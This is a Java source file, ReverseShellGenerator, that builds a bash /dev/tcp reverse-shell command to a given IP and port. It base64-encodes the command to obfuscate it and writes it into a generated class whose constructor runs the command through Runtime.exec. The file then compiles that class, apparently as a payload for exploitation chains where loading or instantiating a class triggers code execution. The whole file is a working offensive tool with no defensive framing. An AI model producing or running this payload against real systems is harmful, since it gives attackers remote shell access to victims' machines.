package org.example;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Base64;

public class ReverseShellGenerator {
    public static void generate(String ip, String port) {
        String test_command = "touch flag.txt";
        String className = "ReverseShell";
        String org_command = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
        System.out.println("\033[32;1m" + "[+]shellCommand is:" + org_command + "\033[0m");
        String base64_command = Base64.getEncoder().encodeToString(org_command.getBytes());
        String command = "bash -c {echo," + base64_command + "}|{base64,-d}|{bash,-i}";
        String javaCode = String.format(
                "import java.lang.Runtime;%n" +
                        "import java.lang.Process;%n%n" +
                        "public class %s {%n" +
                        "    public %s() {%n" +
                        "        try {%n" +
                        "            Runtime.getRuntime().exec(\"%s\");%n" +
                        "        } catch (Exception e) {%n" +
                        "            e.printStackTrace();%n" +
                        "        }%n" +
                        "    }%n%n" +
                        "    public static void main(String[] argv) {%n" +
                        "        %s e = new %s();%n" +
                        "    }%n" +
                        "}%n",
                className, className, command, className, className
        );

        try (FileWriter fileWriter = new FileWriter(className + ".java")) {
            fileWriter.write(javaCode);
        } catch (IOException e) {
            e.printStackTrace();
        }

        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        int result = compiler.run(null, null, null, className + ".java");
        if (result == 0) {
            System.out.println("\033[32;1m" + "[+]Class compiled success" + "\033[0m");
        } else {
            System.out.println("\033[31;1m" + "[-]Failed to compile class"+ "\033[0m");
        }
    }
}

